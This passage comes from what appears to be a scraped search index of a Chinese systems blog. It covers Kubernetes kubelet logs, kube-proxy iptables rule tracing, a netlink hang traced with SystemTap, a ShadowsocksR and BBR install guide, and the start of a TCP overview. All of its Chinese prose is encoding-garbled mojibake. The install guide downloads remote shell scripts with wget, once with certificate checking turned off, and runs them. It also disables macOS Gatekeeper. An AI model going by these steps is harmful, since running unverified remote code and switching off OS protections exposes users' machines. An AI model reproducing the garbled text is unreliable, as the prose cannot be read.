VM-0-43-ubuntu kubelet[25163]: &quot;isGateway&quot;: true,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;ipMasq&quot;: false,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;hairpinMode&quot;: false,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;ipam&quot;: &#123;Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;type&quot;: &quot;host-local&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;subnet&quot;: &quot;10.255.0.0/29&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;gateway&quot;: &quot;10.255.0.1&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;routes&quot;: [Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &#123; &quot;dst&quot;: &quot;0.0.0.0/0&quot; &#125;Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: ]Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &#125;Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &#125; 12[root@VM_128_11_centos ~]# kubectl get pod --all-namespaces |grep Running | wc -l5 12345678910[root@VM_128_11_centos ~]# kubectl describe node 172.30.0.43...Non-terminated Pods: (5 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits --------- ---- ------------ ---------- --------------- ------------- default guohao-555fb5456d-kjzrk 0 (0%) 0 (0%) 0 (0%) 0 (0%) default guohao-555fb5456d-lxrmn 0 (0%) 0 (0%) 0 (0%) 0 (0%) default guohao-555fb5456d-t4fq4 0 (0%) 0 (0%) 0 (0%) 0 (0%) default guohao-555fb5456d-t9k2b 0 (0%) 0 (0%) 0 (0%) 0 (0%) kube-system l7-lb-controller-95dcf7bd7-v9wx7 0 (0%) 0 (0%) 0 (0%) 0 (0%) ç»“è®ºå½“æ—¶masksizeä¸º30å’Œ29æ—¶å€™éƒ½æ˜¯ç¬¦åˆé¢„æœŸçš„ï¼Œä½†æ˜¯é—®é¢˜æ˜¯åªæœ‰ä½¿ç”¨kubenetæ—¶è¿™ä¸ªpatchæ‰èƒ½æ­£å¸¸å·¥ä½œï¼Œå¦‚æœä½¿ç”¨å…¶ä»–çš„CNIå®ç°è¿™æ ·å®ç°å°±æ˜¾å¾—å¾ˆé¸¡è‚‹ã€‚å› ä¸ºPodCIDRæ˜¯è¢«kubenetä¼ é€’ç»™host-localæ’ä»¶çš„ï¼Œå…¶ä½™çš„cniæ’ä»¶ä¸ä¸€å®šä½¿ç”¨è¿™ä¸ªã€‚","tags":["å®¹å™¨"]},{"title":"kube-proxy iptables è§„åˆ™ç”Ÿæˆ","path":"/2018/07/11/kube-proxy-iptables/","content":"â€‹\tåšå®¹å™¨ä¹Ÿæœ‰åŠå¹´äº†ï¼Œå†™éœ€æ±‚çš„è¿‡ç¨‹ä¸­å‘ç°å½“æˆ‘åˆ›å»ºLoaderBalancerç±»å‹çš„serviceæ—¶å€™kube-proxy iptablesæ¨¡å¼ä¼šäº§ç”Ÿä¸€æ¡å…¬ç½‘è§„åˆ™çš„åŒæ­¥åˆ°é›†ç¾¤ä¸­çš„å…¨éƒ¨èŠ‚ç‚¹ä¸Šã€‚å½“æ—¶æˆ‘å°±å¾ˆå¥‡æ€ªä¸ºå•¥å…¬ç½‘ lb è¿˜è¦ç”Ÿæˆiptablesè§„åˆ™ã€‚ â€‹\tåœ¨æ¢³ç† iptables è§„åˆ™ä¹‹å‰å…ˆçœ‹ä¸€ä¸‹loadBalancerç±»å‹çš„kuberntes serviceçš„æµé‡é“¾è·¯ï¼Œä»¥è…¾è®¯äº‘ä¸ºä¾‹çœ‹ä¸€ä¸‹è…¾è®¯äº‘TKEä¸‹çš„æµé‡é“¾è·¯ï¼Œé€šè¿‡å’¨è¯¢çš„æ–¹å¼çŸ¥é“äº†ï¼Œè…¾è®¯äº‘çš„å…¬ç½‘æ–¹æ¡ˆå®é™…æ˜¯k8sçš„å»clbå»ä¹°äº†ä¸€ä¸ª lbï¼Œç»“åˆclbçš„å®˜æ–¹äº§å“æ–‡æ¡£ï¼Œç†è§£å‡ºæ¥çš„æµé‡çš„å…¥é“¾è·¯å¦‚ä¸‹ï¼š 1traffic in -&gt; clb(TGW-&gt;GRE tunnel-&gt;vm) -&gt; iptables -&gt; pod â€‹\tåœ¨è…¾è®¯äº‘ä¸‹é€šè¿‡è…¾è®¯äº‘clbçš„äº§å“æ–‡æ¡£ï¼ŒçŸ¥é“æµé‡æœ€åä¼šåˆ°èŠ‚ç‚¹ä¸Šï¼Œåé¢å°±æ˜¯æµé‡äº¤ç»™iptablesï¼ˆkuberntes 1.10 ipvs ç‰¹æ€§å°± stable äº†ï¼‰è§„åˆ™å°†æµé‡è½¬å‘åˆ° pod é‡Œé¢ã€‚ åœ¨è…¾è®¯äº‘çš„ TKE æ§åˆ¶å°åˆ›å»ºäº†ä¸€ä¸ªæœåŠ¡å¹¶é€‰æ‹©äº†å…¬ç½‘åœ°å€ï¼Œå¹¶ç™»å½• node ä¸ŠæŸ¥çœ‹kuberntesçš„serviceä¿¡æ¯ï¼š 1234ubuntu@VM-0-42-ubuntu:~$ kubectl get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEkubernetes ClusterIP 10.123.63.1 &lt;none&gt; 443/TCP 3hsleep LoadBalancer 10.123.63.85 118.24.224.100 80:30392/TCP 6m å…¥æµé‡çš„æ¢ç´¢â€‹\té€šè¿‡ get svc çŸ¥é“äº†ç”³è¯·åˆ°çš„å…¬ç½‘ ip æ˜¯118.24.224.100ã€‚iptables -j é€‰é¡¹åé¢çš„å‚æ•°å«target,å…¶å®-jçš„æ„æ€æ˜¯jumpï¼Œå¯ä»¥æ„Ÿæ€§çš„ç†è§£ä¸ºè½¬è·³åˆ°è¿™ä¸ªtargetä¸Šç»§ç»­å¤„ç†ã€‚ä½¿ç”¨è¿™ä¸ªåœ°å€åœ¨iptablesé‡Œé¢æœç´¢ä¸€ä¸‹å‘ç°å¦‚ä¸‹ä¸€ä¸ªè§„åˆ™ (è§„åˆ™çš„è·Ÿå…¥éµå¾ªå¹¿åº¦ä¼˜å…ˆåŸåˆ™): 12ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save |grep 118.24.224.100-A KUBE-SERVICES -d 118.24.224.100/32 -p tcp -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -m tcp --dport 80 -j KUBE-FW-KHFRG3HD2BG7I4YD â€‹\tä»¥targetåå­—ä½œä¸ºå…³é”®å­—æœç´¢å¦‚ä¸‹ï¼Œå‘ç°KUBE-FW-å¼€å¤´çš„å…¶å®æ˜¯forwardçš„æ„æ€ä¸æ˜¯firewallğŸ˜„ï¼Œå‘ç°ä¸‰ä¸ªæ–°çš„è§„åˆ™ç¬¬ä¸€ä¸ªè½¬è·³çš„targetå«KUBE-MARK-MASQ,ç¬¬äºŒä¸ªå«KUBE-SVC-KHFRG3HD2BG7I4YD,ç¬¬ä¸‰ä¸ªå«KUBE-MARK-DROPã€‚å…·ä½“è¿™äº›targetåˆ°è¿™ä¸ªé˜¶æ®µæ˜¯åšä»€ä¹ˆçš„è¿˜ä¸æ¸…æ¥šã€‚è€Œä¸”reviewå…¨éƒ¨çš„iptables-saveçš„è¾“å‡ºå‘ç°ç»å¤§å¤šæ•°çš„kuberntesçš„è§„åˆ™éƒ½åœ¨natè¡¨é‡Œé¢ã€‚ 123456ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save |grep KUBE-FW-KHFRG3HD2BG7I4YD:KUBE-FW-KHFRG3HD2BG7I4YD - [0:0]-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-MARK-MASQ-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-SVC-KHFRG3HD2BG7I4YD-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-MARK-DROP-A KUBE-SERVICES -d 118.24.224.100/32 -p tcp -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -m tcp --dport 80 -j KUBE-FW-KHFRG3HD2BG7I4YD â€‹\tæ¢ç´¢ä¸€ä¸‹KUBE-MARK-MASQ,å‘ç°å…¶å®å°±æ˜¯kube-proxyè°ƒç”¨iptablesç»™æµé‡åšä¸ª0x4000/0x4000çš„æ ‡è®°ã€‚ 1234ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save | grep KUBE-MARK-MASQ:KUBE-MARK-MASQ - [0:0]-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-MARK-MASQ-A KUBE-MARK-MASQ -j MARK --set-xmark 0x4000/0x4000 â€‹\tæ¢ç´¢ä¸€ä¸‹KUBE-SVC-KHFRG3HD2BG7I4YD,å‘ç°åˆæœ‰ä¸€æ¬¡è½¬è·³åˆ°KUBE-SEP-GZIIAEF444AZU3YY,ç›®å‰ç›®å‰è¿™ä¸ªé˜¶æ®µè¿˜ä¸çŸ¥é“è¿™ä¸ªtargetæ˜¯å¹²å˜›çš„ã€‚ 123456ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save |grep KUBE-SVC-KHFRG3HD2BG7I4YD:KUBE-SVC-KHFRG3HD2BG7I4YD - [0:0]-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-SVC-KHFRG3HD2BG7I4YD-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;default/sleep:tcp-80-80-8r4el&quot; -m tcp --dport 30392 -j KUBE-SVC-KHFRG3HD2BG7I4YD-A KUBE-SERVICES -d 10.123.63.85/32 -p tcp -m comment --comment &quot;default/sleep:tcp-80-80-8r4el cluster IP&quot; -m tcp --dport 80 -j KUBE-SVC-KHFRG3HD2BG7I4YD-A KUBE-SVC-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el&quot; -j KUBE-SEP-GZIIAEF444AZU3YY â€‹\tæ¢ç´¢ä¸€ä¸‹KUBE-MARK-DROP,å‘ç°å…¶å®å°±æ˜¯kube-proxyè°ƒç”¨iptablesç»™æµé‡åšä¸ª0x8000/0x8000çš„æ ‡è®°ã€‚ 1234ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save | grep KUBE-MARK-DROP:KUBE-MARK-DROP - [0:0]-A KUBE-FW-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el loadbalancer IP&quot; -j KUBE-MARK-DROP-A KUBE-MARK-DROP -j MARK --set-xmark 0x8000/0x8000 â€‹\té€šè¿‡KUBE-SVC-KHFRG3HD2BG7I4YDè½¬è·³åˆ°-j DNAT --to-destination 10.123.32.5:80,è¿™é‡Œåšäº†æµé‡çš„å®é™…è½¬å‘ã€‚ 12345ubuntu@VM-0-42-ubuntu:~$ sudo iptables-save |grep KUBE-SEP-GZIIAEF444AZU3YY:KUBE-SEP-GZIIAEF444AZU3YY - [0:0]-A KUBE-SEP-GZIIAEF444AZU3YY -s 10.123.32.5/32 -m comment --comment &quot;default/sleep:tcp-80-80-8r4el&quot; -j KUBE-MARK-MASQ-A KUBE-SEP-GZIIAEF444AZU3YY -p tcp -m comment --comment &quot;default/sleep:tcp-80-80-8r4el&quot; -m tcp -j DNAT --to-destination 10.123.32.5:80-A KUBE-SVC-KHFRG3HD2BG7I4YD -m comment --comment &quot;default/sleep:tcp-80-80-8r4el&quot; -j KUBE-SEP-GZIIAEF444AZU3YY â€‹\té€šè¿‡kuberntesçš„get endpointæˆ‘çœ‹åˆ°äº†æˆ‘åˆ›å»ºçš„podçš„endpointäº†ã€‚ 1234ubuntu@VM-0-42-ubuntu:~$ kubectl get epNAME ENDPOINTS AGEkubernetes 169.254.128.13:60002 3hsleep 10.123.32.5:80 8m ä¸ºä»€ä¹ˆå…¬ç½‘ä¹Ÿéœ€è¦ç”Ÿæˆè§„åˆ™ï¼Ÿâ€‹\tç›®å‰ç†è§£æ˜¯â€å¦‚æœ pod æˆ–é›†ç¾¤ä¸­èŠ‚ç‚¹ä¹Ÿéœ€è¦å»è®¿é—®è¿™ä¸ªå…¬ç½‘çš„ ip åœ°å€ï¼Œå¯ä»¥é¿å…æµé‡çš„èµ°å…¬ç½‘ç»•ä¸€åœˆâ€œã€‚ è¢«æ‰“äº†æ ‡è®°çš„æµé‡å¤„ç†æ–¹å¼â€‹\tçœ‹ä¸€ä¸‹è¢«åšæ ‡è®°çš„æµé‡çš„å¤„ç†æ–¹å¼ï¼š 12-A KUBE-FIREWALL -m comment --comment &quot;kubernetes firewall for dropping marked packets&quot; -m mark --mark 0x8000/0x8000 -j DROP-A KUBE-FORWARD -m comment --comment &quot;kubernetes forwarding rules&quot; -m mark --mark 0x4000/0x4000 -j ACCEPT","tags":["å®¹å™¨"]},{"title":"the issue of netlink hang","path":"/2017/10/30/netlink-hang/","content":"æˆ‘ä»¥ä¸ºæˆ‘ä»¥åç”¨ä¸åˆ° netlink äº†å‘¢ï¼Œä»Šå¤©åˆè¸©å‘äº†ã€‚ å…¬å¸çš„åŸºç¡€æ¶æ„ç›‘æ§è¿›ç¨‹çš„ä¸€ä¸ªçº¿ç¨‹é€šè¿‡ netlink å»è·å–å†…æ ¸æ•°æ®ï¼Œé˜»å¡ IO ä¸è¿”å›ï¼Œå¯¼è‡´æ•°æ®ä¸¢ç‚¹ã€‚ 1234567891011121314151617goroutine 18735 [syscall, 42 minutes]:syscall.Syscall6(0x2d, 0x15, 0xc4206be000, 0x1000, 0x0, 0xc420345990, 0xc420345984, 0x2b, 0x7fd1b8a30ac0, 0x4535f0)\t/usr/local/go/src/syscall/asm_linux_amd64.s:44 +0x5syscall.recvfrom(0x15, 0xc4206be000, 0x1000, 0x1000, 0x0, 0xc420345990, 0xc420345984, 0x0, 0xc4205a0c00, 0x48)\t/usr/local/go/src/syscall/zsyscall_linux_amd64.go:1712 +0x99syscall.Recvfrom(0x15, 0xc4206be000, 0x1000, 0x1000, 0x0, 0x1000, 0x0, 0x103ea00, 0xc4201b1720, 0x0)\t/usr/local/go/src/syscall/syscall_unix.go:252 +0xafgithub.com/eleme/netlink.(*NetlinkSocket).Receive(0xc4201b1700, 0xc4202ebe00, 0x0, 0x0, 0x1, 0xc4201649d0)\t/go/src/github.com/eleme/netlink/socket.go:70 +0x86github.com/eleme/esm-agent/collector.readStats(0x0, 0x0, 0x0, 0x0, 0x0)\t/go/src/github.com/eleme/esm-agent/collector/tcpstat.go:133 +0x372github.com/eleme/esm-agent/collector.(*TcpStatCollector).Collect(0x109c8c8, 0x7fd1b8a2c4f8, 0xc4206adc80, 0x1, 0x2)\t/go/src/github.com/eleme/esm-agent/collector/tcpstat.go:209 +0x26github.com/eleme/esm-agent/collector/basic.(*collectorService).Start.func1(0xc4202242a0, 0x7fd1b8a2c4f8, 0xc4206adc80, 0xc4204cb0e0)\t/go/src/github.com/eleme/esm-agent/collector/basic/basic.go:36 +0x15fcreated by github.com/eleme/esm-agent/collector/basic.(*collectorService).Start\t/go/src/github.com/eleme/esm-agent/collector/basic/basic.go:45 +0x5d ä¸Šé¢æ˜¯ calltraceï¼Œä¸‹åŠéƒ¨åˆ†çš„ calltrace æ˜¯ç›‘æ§ç¨‹åºå†…ç½®çš„åˆ†æå·¥å…·ã€‚ æ ¹æ® io æ¨¡å‹æ¨æµ‹ï¼Œå¹¶æ‰¾åˆ°å†…æ ¸ä»£ç å…¥å£ï¼ˆä»£ç å‚è€ƒçš„æ˜¯ upstream çš„ v3.10-rc1ï¼Œçº¿ä¸Š 3.10.0-229.el7.x86_64)ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687882130 static int netlink_recvmsg(struct kiocb *kiocb, struct socket *sock,2131 struct msghdr *msg, size_t len,2132 int flags)2133 &#123;2134 struct sock_iocb *siocb = kiocb_to_siocb(kiocb);2135 struct scm_cookie scm;2136 struct sock *sk = sock-&gt;sk;2137 struct netlink_sock *nlk = nlk_sk(sk);2138 int noblock = flags&amp;MSG_DONTWAIT;2139 size_t copied;2140 struct sk_buff *skb, *data_skb;2141 int err, ret;21422143 if (flags&amp;MSG_OOB)2144 return -EOPNOTSUPP;21452146 copied = 0;21472148 skb = skb_recv_datagram(sk, flags, noblock, &amp;err);2149 if (skb == NULL)2150 goto out;21512152 data_skb = skb;21532154 #ifdef CONFIG_COMPAT_NETLINK_MESSAGES2155 if (unlikely(skb_shinfo(skb)-&gt;frag_list)) &#123;2156 /*2157 * If this skb has a frag_list, then here that means that we2158 * will have to use the frag_list skb&#x27;s data for compat tasks2159 * and the regular skb&#x27;s data for normal (non-compat) tasks.2160 *2161 * If we need to send the compat skb, assign it to the2162 * &#x27;data_skb&#x27; variable so that it will be used below for data2163 * copying. We keep &#x27;skb&#x27; for everything else, including2164 * freeing both later.2165 */2166 if (flags &amp; MSG_CMSG_COMPAT)2167 data_skb = skb_shinfo(skb)-&gt;frag_list;2168 &#125;2169 #endif21702171 msg-&gt;msg_namelen = 0;21722173 copied = data_skb-&gt;len;2174 if (len &lt; copied) &#123;2175 msg-&gt;msg_flags |= MSG_TRUNC;2176 copied = len;2177 &#125;21782179 skb_reset_transport_header(data_skb);2180 err = skb_copy_datagram_iovec(data_skb, 0, msg-&gt;msg_iov, copied);21812182 if (msg-&gt;msg_name) &#123;2183 struct sockaddr_nl *addr = (struct sockaddr_nl *)msg-&gt;msg_name;2184 addr-&gt;nl_family = AF_NETLINK;2185 addr-&gt;nl_pad = 0;2186 addr-&gt;nl_pid = NETLINK_CB(skb).portid;2187 addr-&gt;nl_groups = netlink_group_mask(NETLINK_CB(skb).dst_group);2188 msg-&gt;msg_namelen = sizeof(*addr);2189 &#125;21902191 if (nlk-&gt;flags &amp; NETLINK_RECV_PKTINFO)2192 netlink_cmsg_recv_pktinfo(msg, skb);21932194 if (NULL == siocb-&gt;scm) &#123;2195 memset(&amp;scm, 0, sizeof(scm));2196 siocb-&gt;scm = &amp;scm;2197 &#125;2198 siocb-&gt;scm-&gt;creds = *NETLINK_CREDS(skb);2199 if (flags &amp; MSG_TRUNC)2200 copied = data_skb-&gt;len;22012202 skb_free_datagram(sk, skb);22032204 if (nlk-&gt;cb &amp;&amp; atomic_read(&amp;sk-&gt;sk_rmem_alloc) &lt;= sk-&gt;sk_rcvbuf / 2) &#123;2205 ret = netlink_dump(sk);2206 if (ret) &#123;2207 sk-&gt;sk_err = ret;2208 sk-&gt;sk_error_report(sk);2209 &#125;2210 &#125;22112212 scm_recv(sock, msg, siocb-&gt;scm, flags);2213 out:2214 netlink_rcv_wake(sk);2215 return err ? : copied;2216 &#125; ğŸ˜„å‡­ç€ç›´è§‰å¼€å§‹æ’æ¡©ï¼š 1234567891011# cat l.stpglobal callglobal retprobe kernel.function(&quot;netlink_recvmsg&quot;).return &#123; printf(&quot;netlink_recvmsg ret %d &quot;, ret++);&#125;probe kernel.function(&quot;netlink_recvmsg&quot;)&#123; printf(&quot;netlink_recvmsg call %d &quot;, call++);&#125; å¤šæ¬¡é‡å¯ä¸šåŠ¡çš„ç›‘æ§è¿›ç¨‹åœ¨å¦å¤–ä¸€ä¸ªç»ˆç«¯è§‚å¯Ÿï¼Œé‡å¯è¿›ç¨‹ 5 æ¬¡ï¼Œå‘ç°è®¡æ•°ç¨³å®šä¸€æ®µæ—¶é—´åï¼ˆå¤§çº¦æ¯ 1&#x2F;30000 ä¸ªè°ƒç”¨ä¸€ä¸ªå›ä¸æ¥ï¼‰ï¼Œå‡ºç°å·®å€¼ã€‚æ¨æµ‹æœ‰ä¸ªè°ƒç”¨æ²¡æœ‰è¿”å›ã€‚ 12345678910111213141516netlink_recvmsg ret 893447netlink_recvmsg call 893449netlink_recvmsg ret 893448netlink_recvmsg call 893450netlink_recvmsg ret 893449netlink_recvmsg call 893451netlink_recvmsg ret 893450netlink_recvmsg call 893452netlink_recvmsg ret 893451netlink_recvmsg call 893453netlink_recvmsg ret 893452netlink_recvmsg call 893454netlink_recvmsg ret 893453netlink_recvmsg call 893455netlink_recvmsg ret 893454 å‘ç°å†…æ ¸ bugï¼Ÿæœ‰å¾…è¿›ä¸€æ­¥éªŒè¯ï¼Œæ€è·¯åˆ†æ 229 å†…æ ¸ netlink å­ç³»ç»Ÿ netlink_recvmsg çš„è°ƒç”¨ç»†èŠ‚ï¼Œå¯èƒ½æœ‰è°ƒç”¨æ²¡æœ‰è¿”å›ã€‚","tags":["linux"]},{"title":"quick install ShadowsocksR + tcp_bbr","path":"/2017/10/16/install-Shadowsocks-r/","content":"æ˜¨å¤©å‡Œæ™¨åˆ°ä»Šå¤©æ—©ä¸Šä¸Šç­å‰æ¢¯å­æŒ‚äº†ï¼Œè¿™é‡Œé‡æ–°æ­å»ºä¸€ä¸ªã€‚ DO ä¸Šå…¥äº†ä¸€ä¸ª$5&#x2F;M çš„ Ubuntu 17.04 x32ï¼Œä¸‹é¢å°±æ˜¯åˆ·è„šæœ¬çš„äº‹æƒ…ã€‚ å®‰è£… shadowsocksRï¼Œéœ€è¦æ³¨æ„çš„äº‹æƒ…å°±æ˜¯ä¸è¦é€‰å®¢æˆ·ç«¯ä¸æ”¯æŒçš„ obfsï¼Œä¸€å¼€å§‹é€‰é”™äº†å¯ä»¥åœ¨/etc/shadowsocks.json ä¸­ä¿®æ”¹ï¼Œä¿æŒå’Œå®¢æˆ·ç«¯å…¼å®¹ã€‚é‡å¯åœ¨/etc/init.d/shadowsocks restart 123wget https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocksR.shchmod a+x shadowsocksR.sh./shadowsocksR.sh ä¸Š tcp bbrï¼Œè„šæœ¬é‡æ–°å®‰è£…äº†ä¸€ä¸ªå†…æ ¸ã€‚ 123wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh è®°å¾— &#x2F;etc&#x2F;sysctl.conf é…ç½®è°ƒæ•´ã€‚ 1234567891011121314151617181920net.core.default_qdisc = fqfs.file-max = 51200net.core.rmem_max = 67108864net.core.wmem_max = 67108864net.core.netdev_max_backlog = 250000net.core.somaxconn = 4096net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 0net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_keepalive_time = 1200net.ipv4.ip_local_port_range = 10000 65000net.ipv4.tcp_max_syn_backlog = 8192net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.tcp_fastopen = 3net.ipv4.tcp_mem = 25600 51200 102400net.ipv4.tcp_rmem = 4096 87380 67108864net.ipv4.tcp_wmem = 4096 65536 67108864net.ipv4.tcp_mtu_probing = 1net.ipv4.tcp_congestion_control = bbr MAC å®¢æˆ·ç«¯æ¨èshadowsocksX-NG-Rï¼Œé‡å¤–ä¸‹è½½çš„åŒ…åœ¨éœ€è¦ mac å¼€æ”¾ä»»æ„å¼€å‘è€… sudo spctl --master-disableï¼Œç„¶ååœ¨ GUI é‡Œé¢é…ç½®ã€‚","tags":["tips"]},{"title":"Linux kernel tcp overview","path":"/2017/10/10/linux-kernel-tcp-overview/","content":"ä¸€ç›´æƒ³æ‰¾æœºä¼šæ¢³ç†ä¸€ä¸‹ kernel çš„ç½‘ç»œå­ç³»ç»Ÿï¼Œä¸å¦‚ç°åœ¨å¼€å§‹åŠ¨æ‰‹åšï¼Œåœ¨æ¢³ç† kernel å‰ï¼Œå…ˆå›é¡¾ä¸€ä¸‹æ“ä½œç³»ç»Ÿæä¾›çš„ç½‘ç»œç¼–ç¨‹ APIã€‚ 0x00 ç”¨æˆ·å¦‚ä½•ä½¿ç”¨æƒ³äº†è§£ä¸€ä¸‹ Linux ä¸‹çš„ tcp ä¸ªäººè®¤ä¸º socket API æ˜¯è‚¯å®šè¦ä»‹ç»çš„ï¼Œè‡ª bsd 4.2 å¼•å…¥åˆ°å¦‚ä»Šå·²ç» 30 å¤šå¹´äº†ï¼Œæ ¸å¿ƒ api æ˜¯éå¸¸ç¨³å®šè§å¦‚ä¸‹è¡¨æ ¼ C&#x2F;S API æœåŠ¡å™¨ç«¯ï¼š socket,bind,listen,accept,shutdownç­‰ â€”â€”â€”â€” â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- å®¢æˆ·ç«¯ï¼š socket, connect, recv,closeç­‰ â€”â€”â€”â€” â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- å‡ ä¸ªç®€å•çš„æ¥å£æœ‰æ•ˆçš„æ§åˆ¶äº†ç½‘ç»œç¼–ç¨‹çš„å¤æ‚åº¦ã€‚ è¿™äº› api å›´ç»•ç€ä¸€ä¸ª socket æ–‡ä»¶æ“ä½œï¼Œè¿™ä¸ªæ–‡ä»¶æŒ‚è½½åœ¨ç›¸å¯¹ç®€å•çš„ sockfs æ–‡ä»¶ç³»ç»Ÿä¸‹é¢ (åœ¨ socket.c ä¸­å®ç°)ï¼Œä¸‹é¢è¿™ä¸ªæ–‡ä»¶æ“ä½œç¬¦ç»“æ„ä½“å®ç°æè¿°äº†è¿™ä¸ªç±»å‹æ–‡ä»¶æ”¯æŒçš„æ–‡ä»¶æ“ä½œã€‚ 1234567891011121314151617static const struct file_operations socket_file_ops = &#123; .owner = THIS_MODULE, .llseek = no_llseek, .read_iter = sock_read_iter, .write_iter = sock_write_iter, .poll = sock_poll, .unlocked_ioctl = sock_ioctl,#ifdef CONFIG_COMPAT .compat_ioctl = compat_sock_ioctl,#endif .mmap = sock_mmap, .release = sock_close, .fasync = sock_fasync, .sendpage = sock_sendpage, .splice_write = generic_splice_sendpage, .splice_read = sock_splice_read,&#125;; ä¸Šé¢è¿™ä¸ªå°±æ˜¯ä½“ç° unix å“²å­¦ Everything is a file çš„ä½“ç°ï¼Œé€šè¿‡ vfs æŠ½è±¡å°†å‡½æ•°æŒ‡é’ˆæ”¾åˆ°ç»“æ„ä½“ä¸­ï¼Œå½“å¯¹å¯¹åº”çš„æ–‡ä»¶è°ƒç”¨å°±å›è°ƒè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿå®ç°çš„å›è°ƒå‡½æ•°ï¼Œæ¯”å¦‚è¯´æˆ‘å¯¹ socket æ–‡ä»¶è¿›è¡Œ mmap è°ƒç”¨ï¼Œåˆ°å…·ä½“çš„æ–‡ä»¶ç³»ç»Ÿä¸­å°±æ˜¯è°ƒç”¨äº† sock_mmap è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿå®ç°ã€‚ è¿™ä¸ª struct å·²ç»æš´éœ²äº†èƒ½å¯¹ socket çš„æ“ä½œäº†ï¼Œä¸è¿‡å¹¶ä¸æ‰“ç®—å¯¹è¿™ä¸ª struct ä¸Šçº ç»“å¤ªå¤šã€‚ ä¸€èˆ¬çš„ä½¿ç”¨åœºæ™¯æ˜¯ï¼Œé¦–å…ˆç”¨æˆ·é€šè¿‡ socket ç³»ç»Ÿè°ƒç”¨åˆ›å»º ipv4 é¢å‘å­—èŠ‚æµå¥—æ¥å­—ï¼Œä¹Ÿå°±æ˜¯æŒ‡çš„ TCP å¥—æ¥å­—ï¼Œå½“å¥—æ¥å­—åˆ›å»ºå®Œæˆè¿‡åå°±å¯ä»¥åƒæ“ä½œæ–‡ä»¶ä¸€æ ·æ“ä½œå¥—æ¥å­—ã€‚ æˆ‘ä»¬è¿™é‡Œå…³æ³¨çš„æ˜¯ ipv4 tcp å¥—æ¥å­—æ˜¯å¦‚ä½•å»ºç«‹çš„ï¼Œå¦‚ä½•ä¼ è¾“æ•°æ®çš„ï¼Œå¦‚ä½•å…³é—­çš„ï¼Œè¿™ä¸‰ä¸ªé—®é¢˜ã€‚ tcp linux å®ç°[^TCP_Implementation]tcp è™šé“¾è·¯çš„å»ºç«‹ï¼Œæœ‰æ•ˆçš„å…³é—­æ˜¯å­¦ä¹  TCP çš„åŸºç¡€ä¸­çš„åŸºç¡€ã€‚ å¤šåœºæ™¯ä¸‹é«˜æ•ˆç‡çš„ä¼ è¾“å­¦ä¹ å’Œç ”ç©¶çš„éš¾ç‚¹ï¼Œå¤šåœºæ™¯çš„ä¾‹å­æœ‰å«æ˜Ÿé“¾è·¯ï¼Œå…¶ç‰¹ç‚¹æ˜¯å¸¦å®½å¤§å»¶è¿Ÿé«˜ï¼›å¹¿åŸŸç½‘ï¼Œå…¶ç‰¹ç‚¹æ˜¯èƒŒæ™¯ä¸¢åŒ…ç‡ï¼ŒIDC å†…éƒ¨ï¼Œä½å»¶è¿Ÿé«˜å¸¦å®½ã€‚ tcp å¥—æ¥å­—çš„å»ºç«‹ä¼—æ‰€å‘¨çŸ¥çš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œå®¢æˆ·ç«¯å‘èµ· synï¼ŒæœåŠ¡ç«¯ ack + synï¼ŒæœåŠ¡ç«¯ ackã€‚è¿™é‡Œä¸€å…±ä¸‰æ¬¡ï¼Œä¸ºä»€ä¹ˆæ˜¯ä¸‰æ¬¡æ˜¯å› ä¸º 2 æ¬¡ä¸èƒ½è¿›è¡ŒåŒå‘ç¡®è®¤ï¼Œ4 æ¬¡æ˜¾çš„æ²¡æœ‰æ•ˆç‡å¤šä¸€æ¬¡å‘åŒ…ã€‚ ç³»ç»Ÿè°ƒç”¨ socket, 